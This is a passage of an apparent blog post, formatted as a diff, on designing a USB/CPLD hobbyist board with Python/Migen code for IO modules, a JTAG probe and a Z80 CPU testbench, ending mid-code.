+[![](/medias/images/bmii/soldering.jpg)](/medias/images/bmii/soldering.jpg)
+
+After hours of painful electrical tests, a first sample of a fully soldered
+board was born by the end of the Spring:
+
+[![](/medias/images/bmii/main2.jpg)](/medias/images/bmii/main2.jpg)
+
+## Chapter II: On Reprogrammability They Hoped
+
+Although the physical board was ready, a firmware was still needed to make it
+working. The situation was more complex than just a simple binary located in a
+single ROM as most of the boards of this category are.
+
+First of all, the firmware for the FX2LP had been implemented which basically
+consisted to configure the USB and the GPIF units of the chip. Nothing uncommon
+here: writing applications for this kind of microcontroller was quite easy as
+it was well-documented and that tons of similar usages of this chip already
+existed and were publicly available. The code has been written in a couple of
+hours and no new features have been added since as they decided to make the
+firmware serving only one unique purpose: translate USB data to IO controller
+in the most simple and lightweight way.
+
+For them, most of the customizations that would be needed should be
+fully-implemented at the IO controller level. The real challenge here was to
+take advantage of the CPLD as a powerful and programmable IO controller.
+
+One solution would be to base the CPLD's design on a soft-processor: modifying
+IO's behaviour would mean loading a new firmware into its RAM. Although this
+architecture was quite common when using an FPGA, it became more inconvenient
+when basing it on a CPLD due to the lack of memory blocks.
+
+The second solution would be to generate and configure the design of the CPLD
+according to the user's needs dynamically. As pursuing this concept using a
+regular hardware description language seemed almost impossible for them, they
+decided to fully base the design generation on
+[Migen](https://github.com/m-labs/migen). This python module allowed the
+meta-programming of synchronous register transfer level design and handled the
+generation of a verilog file that could then be synthesised by the regular
+Altera's toolchain.
+
+### Section I: Modularity And Modulation
+
+They fully defined the architecture around the concept of modularity. To
+demonstrate how it would transpire in a real context, they took the example of
+a Pulse-Width Modulation interface.
+
+The main principal of such technique was to use a rectangular pulse wave whose
+pulse width was modulated resulting in the variation of the average value of
+the waveform.
+
+A possible implementation of a PWM module could be achieved by using a counter
+whose width defined the period of the signal and a digital comparator to
+generate the needed duty cycle.
+
+In this case, the only signal that was likely exposed externally
+would be the output of the comparator, negated or not. Moreover, a 'parameter'
+of this circuit would be the left-input of the comparator and was typically the
+kind of signal that would be interesting to implement as a register writable
+from the host.
+
+For their example, they also considered that the counter value could
+be watched from the host.
+
+[![](/medias/images/bmii/pwm_bd.svg)](/medias/images/bmii/pwm_bd.svg)
+
+The 'parameter' signals were called 'Control Registers' and were intended to be
+readable and/or writable from the host while the signals that would be eligible
+to be mapped to a physical pin of the CPLD were called 'IO Signals'.
+
+In a more generic way, this kind of module, that they called 'IO Module', could
+always be represented according to the following template:
+
+- An internal logic block that could contain both combinational and sequential
+    logic left to IO Module's discretion.
+
+- 'Control Registers' connected to an internal bus and used to watch and
+    control the activity of the internal logic from the host.
+
+- 'IO Signals' intended to interact with an external component and to be
+    mapped to real pin.
+
+[![](/medias/images/bmii/iomodule.svg)](/medias/images/bmii/iomodule.svg)
+
+Imposing such kind of interface also meant imposing a huge, redundant and
+overblown part of HDL code only to ensure the glue logic between the core logic
+of the module and the rest of the design. This was where meta-programming
+became appropriated.
+
+A python module called *bmii* had been developed to extend the structures
+provided by Migen. For instance, an extension of the
+['Module'](https://migen.readthedocs.io/en/latest/fhdl.html) objects was
+included in this library to add all facilities needed to generate the
+intended glue logic.
+
+    :::python
+    from bmii import *
+
+    iom = IOModule("pwm")
+
+This object contained the `cregs` special attribute which was used to manage
+the control registers of the `IOModule`. `CtrlReg` was charged to construct a
+special 8-bit width Migen's
+[`Signal`](https://migen.readthedocs.io/en/latest/fhdl.html#signal) which
+embedded extra information needed to build the control registers network.
+The direction of such register had to be manually specified during
+instantiation. It could be:
+
+- `RDONLY`: Only readable from the host. The signal had to be driven by the
+    internal logic of the `IOModule`.
+- `WRONLY`: The signal could only be latched from the host but could not read
+    it back. This direction was useful to suggest the toolchain to synthesise
+    this signal as a `wire` instead of a verilog's `reg`.
+- `RDWR`: The signal could be read and written from the host. Synthesis of this
+    kind of signal would likely result to verilog's `reg`.
+
+For the PWM `IOModule`, only the pulse's `WIDTH` and the `COUNTER` signals had
+to be accessed from the host.
+
+    :::python
+    iom.cregs += CtrlReg("WIDTH", CtrlRegDir.RDWR)
+    iom.cregs += CtrlReg("COUNTER", CtrlRegDir.RDONLY)
+
+In the same way, `iosignals` attribute handled the signals intended to be
+mapped to physical pins. An `IOSignal` always correspond to a 1-bit width
+signal. The direction of an `IOSignal` was also needed to be explicitly
+specified.
+
+- `OUT`: Signal driven by the `IOModule`.
+- `IN`: Signal driven by an external component and read by the `IOModule`'s
+    logic.
+- `DIRCTL`: Signal driven by the `IOModule` and used to control the tri-state
+    buffer of a pin.
+
+The PWM only used two outputs:
+
+    :::python
+    iom.iosignals += IOSignal("OUT", IOSignalDir.OUT)
+    iom.iosignals +=  IOSignal("NOUT", IOSignalDir.OUT)
+
+Finally, the internal logic could be described by using Migen's
+[special attributes](https://migen.readthedocs.io/en/latest/fhdl.html#summary-of-special-attributes):
+
+    :::python
+    iom.sync += iom.cregs.COUNTER.eq(iom.cregs.COUNTER + 1)
+    iom.comb += iom.iosignals.OUT.eq(iom.cregs.COUNTER &lt; iom.cregs.WIDTH)
+    iom.comb += iom.iosignals.NOUT.eq(~iom.iosignals.OUT)
+
+### Section II: An Iron Hand In A Velvet Glove
+
+The concept of control register was illustrated and justified. Their aim was
+then to think about how to make them accessible from the host by using USB.
+
+Concretely, this step meant defining a unit that would be able to translate
+GPIF waveforms to a more convenient protocol to drive the internal bus.
+This unit had been called 'Northbridge'.
+
+The internal bus had been defined as follow:
+
+- `MOSI[0:7]` and `MISO[0:7]` represented the both directions of the data bus.
+- `WR` distinguished a read or a write operation.
+- `MADDR[0:2]` and `RADDR[0:4]` were used to generate the *chip select* signal
+    for a module and a control register respectively.
+- `REQ` informed the control register that an operation was going to
+    be performed.
+
+The issue here was related to the fact that the GPIF data bus had exactly the
+same width that a control register. This meant that the addressing and the
+read/write operations on the internal bus could not be achieved in a
+single clock tick.
+
+From the GPIF point of view, performing an operation on the internal bus meant
+sending the module/control register address (latched by the Northbridge) before
+proceeding to the actual read/write operation.
+
+The northbridge managed the GPIF's control signals as follow:
+
+- `CTL0` and `CTL1` were basically forwarded to the `REQ` and `WR` signals of
+    internal bus respectively.
+- `CTL2` was used to indicate that the USB controller was latching an address
+    and that the current operation must not be considered as a regular write
+    operation.
+
+The northbridge was polling for operation by checking the value of the `CTL0`
+signal when clocking the interface clock.
+
+[![](/medias/images/bmii/northbridge.svg)](/medias/images/bmii/northbridge.svg)
+
+In addition of containing a value, control registers were generated with extra
+signals used to represent the operation currently performed on it and then
+facilitated their usage from the internal logic.
+
+The `wr` and `rd` signals indicated that the control register was selected
+and that a write or read operation respectively was going to be performed.
+These signals were asserted during several clock ticks as they were directly
+forwarded by the northbridge from the GPIF. So to facilitate the use of them in
+a synchronous circuit, `wr_pulse` and `rd_pulse` were derived from the previous
+signals. By using a 'level to pulse' state machine, `wr_pulse` were implemented
+to be asserted during exactly one clock tick when the write operation was
+completed and then indicated to the internal logic that a valid value was
+available in the register. In a meantime, `rd_pulse` pulsed the beginning of
+the read operation to inform the `IOModule` that the control register was going
+to be read and then gave it time to feed a correct value before the next
+falling edge of `rd` signal, moment when its value was actually captured by the
+northbridge.
+
+[![](/medias/images/bmii/creg.svg)](/medias/images/bmii/creg.svg)
+
+At that point, any control register could be accessed from the host using the
+correct USB request. In order to make the usage of the USB easier from the host
+point of view, an additional interface had been introduced: the `BMIIModule`.
+
+A python object of this type contained two special attributes: the first one
+was the `IOModule` which represented the RTL design while the
+second was called the *driver* of the `BMIIModule`. Automatically created,
+the `drv` attribute was able to inspect the `IOModule` to generate the correct
+USB request according to the information specified in the RTL about the
+control registers addresses and directions.
+
+    :::python
+    pwm = BMIIModule(iom)
+
+To finalize the generation of the IO controller design, the `BMII` object acted
+as a top-level representation of the whole design of the board. It must be
+informed that a new module had to be added by using its `add_module` method.
+
+A call to this procedure meant connecting the `IOModule` to the internal bus,
+allocating module and control registers addresses.
+
+    :::python
+    b = BMII()
+    b.add_module(pwm)
+
+Once the CPLD configured, the host could easily accessed the control registers
+by simply setting the attributes of the `drv` aliased with the control
+registers names:
+
+    :::python
+    pwm.drv.WIDTH = 42
+    cnt = int(pwm.drv.COUNTER)
+
+### Section III: The Signal Goes South
+
+In the same way the northbridge managed the communication with the external
+USB controller, a other dedicated unit had been defined to handle the
+multiplexing of the `IOSignals` to physical IO pins. Obviously called the
+`southbridge`, it was implemented as a special `IOModule` which had no
+`IOSignals` and was only charged to manage the signals coming from other
+modules. For each physical pin, the southbridge was charged to generate the
+following circuit:
+
+[![](/medias/images/bmii/pinmux.svg)](/medias/images/bmii/pinmux.svg)
+
+Each pin was considered bidirectional and the direction could be configured
+with an `IOSignal` defined as such. An unlimited number of signals could read
+the value of a pin while only one could drive it.
+
+To inform the southbridge that an `IOSignal` had to be connected to a pin,
+assignment to `pins` attribute of this unit had to be performed
+as follow:
+
+    :::python
+    b.ioctl.sb.pins.LED0 += pwm.iomodule.iosignals.OUT
+
+The direction declared during the definition of the `IOSignal` were used to
+determine where the signal had to be connected on the pin multiplexing circuit.
+
+As the southbridge was considered as a regular `IOModule`, it was connected to
+the internal bus and then exposed its own control registers.
+This opportunity was leveraged to make the pins controllable from host
+bypassing the need of defining a specific `IOModule` when a simple operation
+had to be performed on the IOs.
+
+`PINDIR`, `PINDIRMUX`, `PINOUT`, `PINMUX` and `PINSCAN` signals of each pin
+were accessible using southbridge's control registers. For instance, making the
+LED blinked could be commanded by:
+
+    :::python
+    b.modules.southbridge.drv.PINMUXMISC.LED1 = 1       # Make the southbridge drive the LED0 pin
+    b.modules.southbridge.drv.PINOUTMISC.LED1 = \
+        int(b.modules.southbridge.drv.PINSCANMISC.LED1) ^ 1     # Toggle the LED0 pin
+
+For the example design previously defined, a complete mapping of the internal
+bus's address space looked as follow:
+
+    :::python
+    b.list_modules()
+    -- 
+    0x0: northbridge
+    	0x0: IDCODE (CtrlRegDir.RDONLY)
+    	0x1: SCRATCH (CtrlRegDir.RDWR)
+    0x1: southbridge
+    	0x0: PINDIR1L (CtrlRegDir.RDWR)
+    	0x1: PINDIR1H (CtrlRegDir.RDWR)
+    	0x2: PINDIR2L (CtrlRegDir.RDWR)
+    	0x3: PINDIR2H (CtrlRegDir.RDWR)
+    	0x4: PINSCAN1L (CtrlRegDir.RDONLY)
+    	0x5: PINSCAN1H (CtrlRegDir.RDONLY)
+    	0x6: PINSCAN2L (CtrlRegDir.RDONLY)
+    	0x7: PINSCAN2H (CtrlRegDir.RDONLY)
+    	0x8: PINSCANMISC (CtrlRegDir.RDONLY)
+    	0x9: PINMUX1L (CtrlRegDir.RDWR)
+    	0xa: PINMUX1H (CtrlRegDir.RDWR)
+    	0xb: PINMUX2L (CtrlRegDir.RDWR)
+    	0xc: PINMUX2H (CtrlRegDir.RDWR)
+    	0xd: PINDIRMUX1L (CtrlRegDir.RDWR)
+    	0xe: PINDIRMUX1H (CtrlRegDir.RDWR)
+    	0xf: PINDIRMUX2L (CtrlRegDir.RDWR)
+    	0x10: PINDIRMUX2H (CtrlRegDir.RDWR)
+    	0x11: PINMUXMISC (CtrlRegDir.RDWR)
+    	0x12: PINOUT1L (CtrlRegDir.RDWR)
+    	0x13: PINOUT1H (CtrlRegDir.RDWR)
+    	0x14: PINOUT2L (CtrlRegDir.RDWR)
+    	0x15: PINOUT2H (CtrlRegDir.RDWR)
+    	0x16: PINOUTMISC (CtrlRegDir.RDWR)
+    0x2: PWM
+    	0x0: WIDTH (CtrlRegDir.RDWR)
+    	0x1: COUNTER (CtrlRegDir.RDONLY)
+
+The northbridge used two control registers defined for testing purposes only.
+The `IDCODE` contained a magic number read by the USB controller to verify the
+validity of the CPLD's configuration while the `SCRATCH` register was used to
+test write operations on the bus.
+
+To sum up, the following architecture had been defined as the basis for further
+improvements:
+
+![](/medias/images/bmii/ioctl.svg)
+
+### Section IV: An Autarchical Sequence
+
+As this architecture was mainly based on the flexibility provided by the CPLD,
+one issue still remained before becoming truly usable: the compiling and
+programming sequences of a BMII's design had to stay self-contained and to avoid
+the need of external hardware tools.
+
+The building sequence aimed to produce the binary blob of the USB firmware as
+well as the bitstream of the IO controller. For the FX2LP, a *ninja* build file
+was generated to proceed to the compiling of the custom firmware using
+[sdcc](http://sdcc.sourceforge.net/).
+
+Concerning the IO controller, the verilog generation was left to Migen while
+the building of the bitstream was ensured by Quartus.
+
+    :::python
+    b.build_all()
+
+The programming sequence was a bit more tricky. A first and trivial way to
+achieve this was to use a
+[USB Blaster](https://www.altera.com/products/boards_and_kits/download-cables.html)
+JTAG probe to configure the CPLD with the desired bitstream. In order to be
+self-programmed, the CPLD's JTAG signals had been connected to a tri-state
+buffer in addition to the regular 10-pin JTAG header. Ensured by a standard
+74244, this buffer was driven by the USB controller. The goal of this circuit
+was to give the ability to communicate with the CPLD via JTAG when the `JTAGE`
+was asserted.
+
+[![](/medias/images/bmii/sp.svg)](/medias/images/bmii/sp.svg)
+
+To be able to reuse *Quartus Programmer* software to program the CPLD, the
+open-source implementation of the USB Blaster protocol for FX2LP
+([ixo.de USB JTAG](http://ixo-jtag.sourceforge.net/)) had been adapted to match
+the wiring of their circuit.
+
+    :::python
+    b.program_all()
+
+The programming sequence could be summarize as follow:
+
+- The first step was to load the custom USB Blaster firmware into the USB
+    controller using [fxload](http://linux-hotplug.sourceforge.net/).
+- If a JTAG IDCODE scan was successful, the bitstream was uploaded using
+    *Quartus Programmer*.
+- To be able to write their own FX2LP firmware to the EEPROM, a second stage
+    firmware loader was programmed in the chip. It added a new USB vendor command
+    allowing writing operations on the I2C bus.
+- Finally, the regular firmware was loaded in the USB controller.
+
+## Chapter III: The Fellowship Of The Joint Test
+
+As a first application of there board, the second tinkerer proposed to
+implement a full-featured JTAG probe that anyone could use as an alternative to
+[Flyswatter](http://www.tincantools.com/JTAG/Flyswatter2.html),
+[Bus Blaster](http://dangerousprototypes.com/docs/Bus_Blaster) or any other
+cheap JTAG probe.
+
+The JTAG defines an electrical standard for on-chip instrumentation by using a
+dedicated debug port implementing a serial communication interface. This
+protocol was well-defined and simple enough to be used as a comprehensive
+example.
+
+The third one replied that demonstrating the usefulness of their project by
+trying to mimic other well-known and mature JTAG probes was a waste of time
+since reaching comparable performance would required more effort that he
+could imagine at the time.
+
+The first tinkerer mitigated that argument by pointing the fact that no cheap
+JTAG probe was generic enough to be compatible with a very wide range of platforms
+and very few of them were designed to be used in contexts other than just CPU's
+on-chip debugging. He agreed and started to think about a possible
+implementation of such protocol using their project.
+
+### Section I: The Bridge Of Shockley
+
+Even though the JTAG standard was quite strict about the communication logic,
+the electrical characteristics of the signals were left to the target device.
+This meant that the probe had the responsibility to drive them with the target
+voltage.
+
+Assuming that the main board was only able to drive 3.3V IOs, expanding it with
+the needed interface was required.
+
+A first version had been implemented using voltage level shifters and worked
+well with some mainstream devices. However, some platforms from specific
+manufacturers pull-up JTAG signals with very low resistors, which forced the
+probe to drive more current than most of the voltage level shifters could
+supply.
+
+As a quick fix, the expansion board had been equipped with bipolar junction
+transistors for output signals.
+
+In a more generic way, they though that being forced to design expansion board
+to electrically convert signals from the main board to the driven target was
+not a big deal. Main board's IO could simply not be electrically universal.
+
+[![](/medias/images/bmii/sch/bmii_jtag_sch.svg)](/medias/images/bmii/sch/bmii_jtag_sch.svg)
+
+[![](/medias/images/bmii/pcb_jtag.png)](/medias/images/bmii/pcb_jtag.png)
+
+### Section II: The Self-Surgery
+
+For a naive implementation of JTAG protocol, the `IOModule` consisted of simply
+connecting the `TMS` and `TDI` outputs to a write-only control register while
+wiring the `TCK` to its `wr_pulse` signal. In this configuration, each JTAG
+clock tick was triggered by writing to this control register.
+
+Each devices on a JTAG's daisy chain communicated via a Test Access Port.
+This hardware unit implemented a stateful protocol to expose its debug
+facilities. As it was possible to make all of them converged to a reset and
+stable state, it was easy to walk though this state machine by keeping all TAPs
+synchronized.
+
+Assuming this, a unique state machine was implemented in the `IOModule` to
+keep the track of the current TAP state. A control register had been allocated
+to allow the host to check this state when needed.
+
+Devices responded to JTAG scans with the `TDO` signal. The FIFO block was
+used to buffer received data before being read by the host thought a read-only
+register. This case perfectly demonstrated the usage of the `rd_pulse` signal
+since it was used to dequeue the next value of the FIFO submodule.
+
+[![](/medias/images/bmii/jtag_bd.svg)](/medias/images/bmii/jtag_bd.svg)
+
+Although most platforms's JTAG daisy chain were short and fixed, some of them
+could dynamically append TAP to the chain, making the usage of general purpose
+JTAG tools unusable. To describe this kind of situation, facilities had been
+implemented to describe a dynamic TAP network.
+
+    :::python
+    from bmii.modules.jtag import JTAG, TAP, DR
+
+A `JTAG` object extended a regular `BMIIModule` to abstract the low-level
+operations to the JTAG's `IOModule`.
+
+`TAP` and `DR` were provided to describe the current layout of the TAP network.
+For instance, describing the Max V's JTAG would look like this:
+
+    :::python
+    class AlteraMaxVJTAG(JTAG):
+        def __init__(self):
+            JTAG.__init__(self)
+
+            tap = TAP("CPLDTAP", 10)    # 10-bit instrwuction register
+
+            #          name             instr. reg.   length
+            tap += DR("SAMPLE/PRELOAD", 0b0000000101, 480)
+            tap += DR("EXTEST",         0b0000001111, 480)
+            tap += DR("BYPASS",         0b1111111111, 1)
+            tap += DR("USERCODE",       0b0000000111, 32)
+            tap += DR("IDCODE",         0b0000000110, 32)
+            tap += DR("HIGHZ",          0b0000001011, 1)
+            tap += DR("CLAMP",          0b0000001010, 32)
+            tap += DR("USER0",          0b0000001100, 32)
+            tap += DR("USER1",          0b0000001110, 32)
+
+            self.add_tap(tap)
+
+            @classmethodw
+            def default(cls, bmii):
+                jtag = cls()
+                bmii.add_module(jtag)
+
+                bmii.ioctl.sb.pins.IO10 += jtag.iomodule.iosignals.TMS
+                bmii.ioctl.sb.pins.IO11 += jtag.iomodule.iosignals.TCK
+                bmii.ioctl.sb.pins.IO12 += jtag.iomodule.iosignals.TRST
+                bmii.ioctl.sb.pins.IO13 += jtag.iomodule.iosignals.TDI
+                bmii.ioctl.sb.pins.IO21 += jtag.iomodule.iosignals.TDO
+
+                return jtag
+
+According to that description, scanning the `IDCODE` of the device could be
+simply done by:
+
+    :::python
+    b = BMII()
+    jtag = AlteraMaxVJTAG.default(b)
+
+    jtag.reset()
+    jtag.irdrscan("CPLDTAP", "IDCODE")
+
+A possible improvement for this would be to generate this tap network
+directly from the BSDL files of daisy chained devices. The usage of BJT to
+drive JTAG signals was also a very quick and easy response to the low
+pull-up resistance problem. The third tinkerer complained that many other
+solutions could be implemented there as the BJT had a very long switching time
+and then forced to drive signals at 12MHz when many targets supported to be
+clocked up to 100MHz in their debug port.
+
+![](/medias/images/bmii/auto_jtag.jpg)
+
+## Chapter IV: And In Darkness Bind Them
+
+Sceptical about the results of the first application, the third tinkerer
+thought about a niche application that only few people would actually need.
+Enthusiastic but upset by the pragmatism of the two other, he left the group to
+develop his idea by his own.
+
+For him, a second purpose for this board was purely and simply to act as a
+test bench for analysing black-boxed devices. To demonstrate his idea, he chose
+the first device he could found on his drawer: a Z80 packaged in a DIP-40.
+
+Primary sold by Zilog as an improved Intel 8080, it had become a very popular
+processor for simple embedded applications since it was truly easy to make this
+chip working with a custom circuit. This device was then the perfect guinea
+pig for his experiences.
+
+### Section I: The Calm Before The Storm
+
+Before trying to blow up the chip, defining the RTL needed to
+correctly drive the CPU was necessary.
+
+    :::python
+    iom = IOModule("Z80TB")
+
+The DIP-40 version of this CPU exposed a 16-bit address bus and a 8-bit data
+bus. As the last one was bidirectional, three different `IOSignals` had to be
+defined: `DIN`, `DOUT` and `DDIR`. In order to keep the main board and the
+device under test synchronized, the CPU's clock was managed by the `IOModule`.
+All other required control signals were defined as `IOSignals`.
+
+    :::python
+    ADDRESS_WIDTH = 14 # Truncated, actually 16.
+    DATA_WIDTH = 8
+
+    iom.iosignals += IOSignal("CLK", IOSignalDir.OUT)
+    iom.iosignals += IOSignal("_M1", IOSignalDir.IN)
+    iom.iosignals += IOSignal("_MREQ", IOSignalDir.IN)
+    iom.iosignals += IOSignal("_IOREQ", IOSignalDir.IN)
+    iom.iosignals += IOSignal("_RD", IOSignalDir.IN)
+    iom.iosignals += IOSignal("_WR", IOSignalDir.IN)
+    iom.iosignals += IOSignal("_WAIT", IOSignalDir.OUT)
+    iom.iosignals += IOSignal("_HALT", IOSignalDir.IN)
+    iom.iosignals += IOSignal("_RESET", IOSignalDir.OUT)
+    iom.iosignals += IOSignal("_RFSH", IOSignalDir.IN)
+
+    for i in range(ADDRESS_WIDTH):
+        iom.iosignals += IOSignal("A{}".format(i), IOSignalDir.IN)
+
+    oe = Signal()
+    for i in range(DATA_WIDTH):
+        iom.iosignals += IOSignal("DIN{}".format(i), IOSignalDir.IN)
+        iom.iosignals += IOSignal("DOUT{}".format(i), IOSignalDir.OUT)
+        iom.iosignals += IOSignal("DDIR{}".format(i), IOSignalDir.DIRCTL)
+        iom.comb += getattr(iom.iosignals,"DDIR{}".format(i)).eq(oe)
+
+From the host point of view, the only reasonable access points was the
+information about the state of the CPU, the address it was accessing and the
+data it transferred.
+
+    :::python
+    iom.cregs += CtrlReg("STATE", CtrlRegDir.RDONLY)
+
+    iom.cregs += CtrlReg("DIN", CtrlRegDir.RDONLY)
+    for i in range(DATA_WIDTH):
+        iom.comb += iom.cregs.DIN[i].eq(getattr(iom.iosignals, "DIN{}".format(i)))
+
+    iom.cregs += CtrlReg("DOUT", CtrlRegDir.WRONLY)
+    for i in range(DATA_WIDTH):
+        iom.comb += getattr(iom.iosignals, "DOUT{}".format(i)).eq(iom.cregs.DOUT[i])
+
+    iom.cregs += CtrlReg("ADDRL", CtrlRegDir.RDONLY)
+    iom.cregs += CtrlReg("ADDRH", CtrlRegDir.RDONLY)
+    for i in range(ADDRESS_WIDTH):
+        if i &lt; 8:
+            addr = iom.cregs.ADDRL
+        else:
+            addr = iom.cregs.ADDRH
+        iom.comb += addr[i % 8].eq(getattr(iom.iosignals, "A{}".format(i)))
+
+A special control register had been added to perform special control
+operations on the CPU. It was mainly used to manually control the `RESET`
+signal forcing the reset of the chip from any CPU state.
+
+    :::python
+    iom.cregs += CtrlReg("CTL", CtrlRegDir.RDWR)
+    iom.cregs.CTL[0] = "RESET"
+
+    iom.comb += iom.iosignals._RESET.eq(~iom.cregs.CTL.RESET)
+
+The clock signal of the Z80 had been fixed to half the frequency of the
+system clock. Due to clocking requirement of the chip, this signal was fixed to
+8MHz.
+
+    :::python
+    iom.sync += iom.iosignals.CLK.eq(~iom.iosignals.CLK)
+
+Requests from the Z80 CPU followed 3 stages. When it was not halted, the
+testbench entered an `IDLE` state. During this one, the CPU was still
+performing operations internally but did not request any external resources.
+
+The second stage followed a request detection. The goal here was to freeze the
+CPU execution until the host provided an instruction to the testbench about how
+to handle the request.
+
+Finally, the last stage meant actually responding to CPU's request according to
+host instructions.
+
+![](/medias/images/bmii/z80fsm.svg)
+
+    :::python
+    from enum import IntEnum
+
+    class Z80State(IntEnum):
+        UNKNOWN = 0b00000000
+        IDLE    = 0b00000001
+        FETCH   = 0b00000010
+        MEMRD   = 0b00000100
+        MEMWR   = 0b00001000
+        IORD    = 0b00010000
+        IOWR    = 0b00100000
+        HALTED  = 0b01000000
+
+To implement this state machine in the RTL, Migen provided a facilities to
+define FSM in its generic library:
+
+    from migen.genlib
+
+    fsm = FSM()
+    iom.submodules += fsm
+
+![](/medias/images/bmii/z80wf.svg)
+
+According to Z80 waveforms, the request for bus access was asserted using
+`_MREQ` or `_IOREQ`. During the request initiation, `_RD`, `_WR` and address bus
+are driven and valid.
+
+When living the `IDLE` state, the testbench could determined what kind of
+request was going to be performed and could notified the host about that.
+
+    :::python
+    fsm.act("IDLE",
+        iom.cregs.STATE.eq(Z80State.IDLE),
+        If(~iom.iosignals._HALT, NextState("HALTED")).\
+        Else(
+            If(~iom.iosignals._MREQ &amp; iom.iosignals._RFSH,
+                If(~iom.iosignals._RD,
+                    If(~iom.iosignals._M1, NextState("FETCH")).\
+                    Else(NextState("MEMRD"))).\
+                Elif(~iom.iosignals._WR, NextState("MEMWR"))).\
+            Elif(~iom.iosignals._IOREQ,
+                If(~iom.iosignals._WR, NextState("IOWR")).\
+                Elif(~iom.iosignals._RD, NextState("IORD")))))
+
+    fsm.act("HALTED",
+        iom.cregs.STATE.eq(Z80State.HALTED),
+        If(iom.iosignals._HALT, NextState("IDLE")))
+
+While waiting for an answer from the host, the trick here was to assert the
+`_WAIT` input of the CPU in order to notify it that bus cycle could not be
+completed at that moment. This left enough time for the host to communicate its
+desired operation. To finalize a write operation, the host just had to read
+from the `WRITE` register. Completed a read operation was performed by
+writing to `READ` control register.
+
+    :::python
+    bus_access = Signal()
+    iom.comb += iom.iosignals._WAIT.eq(~bus_access)
+
+    def goto_rd():
+        return If(iom.cregs.DOUT.wr_pulse, NextState("READ"))
+
+    def goto_wr():
+        return If(iom.cregs.DIN.rd_pulse, NextState("WRITE"))
+
+    fsm.act("FETCH",
+        iom.cregs.STATE.eq(Z80State.FETCH),
+        bus_access.eq(1),
+        goto_rd())
+
+    fsm.act("MEMRD",
+        iom.cregs.STATE.eq(Z80State.MEMRD),
+        bus_access.eq(1),
+        goto_rd())
+
+    fsm.act("MEMWR",
+        iom.cregs.STATE.eq(Z80State.MEMWR),
+        bus_access.eq(1),
+        goto_wr())
+
+    fsm.act("IORD",
+        iom.cregs.STATE.eq(Z80State.IORD),
+        bus_access.eq(1),
+        goto_rd())
+
+    fsm.act("IOWR",
+        iom.cregs.STATE.eq(Z80State.IOWR),
+        bus_access.eq(1),
+        goto_wr())
+
+To finally complete the bus cycle after intervention from the host, the data
+bus just had to be driven in the corresponding direction:
+
+    :::python
+    def goto_idle():
+        return If(iom.iosignals._MREQ &amp; iom.iosignals._IOREQ, NextState("IDLE"))
+
+    fsm.act("READ",
+        iom.cregs.STATE.eq(Z80State.IDLE),
+        oe.eq(1),
+        goto_idle())
+
+    fsm.act("WRITE",
+        iom.cregs.STATE.eq(Z80State.IDLE),
+        goto_idle())
+
+### Section II: The Gates Open
+
+Once the testbench logic defined, the `BMIIModule` could then be integrated to
+a final `BMII` design:
+
+    :::python
+    z80tb = BMIIModule(iom)
+
+    b = BMII()
+    b.add_module(z80tb)
+
+The actual wiring to the tested Z80 looked as follow. Due to the lake of
+physical IO pins on the main board, the two last pins of the address bus had
+been ignored.
+
+[![](/medias/images/bmii/sch/z80.svg)](/medias/images/bmii/sch/z80.svg)
+
+The southbridge had to be informed to this configuration. Any changes on the
+physical circuit only implied rerouting of the testbench's `IOModule` on the
+southbridge unit:
+
+    :::python
+    b.ioctl.sb.pins.IO28 += iom.iosignals._RESET
+    b.ioctl.sb.pins.IO29 += iom.iosignals._WAIT
+    b.ioctl.sb.pins.IO2A += iom.iosignals.CLK
+    b.ioctl.sb.pins.IO2B += iom.iosignals._M1
+    b.ioctl.sb.pins.IO2C += iom.iosignals._MREQ
+    b.ioctl.sb.pins.IO2D += iom.iosignals._IOREQ
+    b.ioctl.sb.pins.IO2E += iom.iosignals._RD
+    b.ioctl.sb.pins.IO2F += iom.iosignals._WR
+    b.ioctl.sb.pins.IO1F += iom.iosignals._HALT
+    b.ioctl.sb.pins.IO1E += iom.iosignals._RFSH
+
+    for i in range(ADDRESS_WIDTH):
+        pin = getattr(b.ioctl.sb.pins, "IO1{}".format(hex(i)[2:].upper()))
+        pin += getattr(iom.iosignals, "A{}".format(i))
+
+    for i in range(DATA_WIDTH):
+        pin = getattr(b.ioctl.sb.pins, "IO2{}".format(i))
+        pin += getattr(iom.iosignals, "DIN{}".format(i))
+        pin += getattr(iom.iosignals, "DOUT{}".format(i))
+        pin += getattr(iom.iosignals, "DDIR{}".format(i))
+
+![](/medias/images/bmii/bmii_z80.jpg)
+
+### Section III: La Grande Illusion
+
+As the IO controller design was completed, the host driver had to be completed
+in order to define the exact behaviour of the testbench.
+
+For this example, the goal was to be able to execute a very short piece of code
+on the connected Z80. The content of the main memory had been defined as:
+
+    :::python
+    def ld_hl_nn(nn):
+        return [0x2A, nn &amp; 0xFF, (nn &gt;&gt; 8) &amp; 0xFF]
+
+    def ld_b_n(n):
+        return [0x06, n]
+
+    def ld_c_n(n):
+        return [0x0E, n]
+
+    def otir():
+        return [0xED, 0xB3]
+
+    def halt():
+        return [0x76]
+
+
+    from itertools import chain, islice, repeat
+
+    s = "LSE"
+    instrs = chain(
+        # Instructions
+        ld_hl_nn(0x000A),    # 0000 - Load string address
+        ld_b_n(len(s)),      # 0003 - Load string length
+        ld_c_n(0),           # 0005 - Set IO port address
+        otir(),              # 0007 - Output the string
+        halt(),              # 0009 - Halt the CPU
+
+        # Data
+        [0x0C, 0x00],        # 000A - String address
+        [ord(c) for c in s], # 000C - String content
+
+        # Padding
+        repeat(halt())       # Fill the rest of the memory
+                             # with HALT instruction
+    )
+
+    mem = list(islice(instrs, 256))
+
+
+The only job of the host was to poll the `STATUS` register and to reply by
+reading from the `DIN` control register or by writing to `DOUT` according to
+the CPU's request.
+
+    :::python
+    recvbuff = ""
+
+    # Reset the CPU by pulsing the _RESET signal
+    z80tb.drv.CTL.RESET = 1
+    z80tb.drv.CTL.RESET = 0
+
+    while True:
+        state = int(z80tb.drv.STATE)
+        print("{}   \t-- Addr: {:04x}".format(str(Z80State(state)),
+                (int(z80tb.drv.ADDRH) &lt;&lt; 8) | int(z80tb.drv.ADDRL)),
+             end='')
+
+        # Emulate main memory reading
+        if (state in [Z80State.FETCH, Z80State.MEMRD]):
+            z80tb.drv.DOUT = mem[int(z80tb.drv.ADDRL)]
+
+        # Emulate main memory writing
+        elif (state == Z80State.MEMWR):
+            mem[int(z80tb.drv.ADDRL)] = int(z80tb.drv.DIN)
+
+        # Emulate reading from device
+        elif (state == Z80State.IORD):
+            z80tb.drv.DOUT = 0xFF
+
+        # Emulate writing to device
+        elif (state == Z80State.IOWR):
+            data = int(z80tb.drv.DIN)
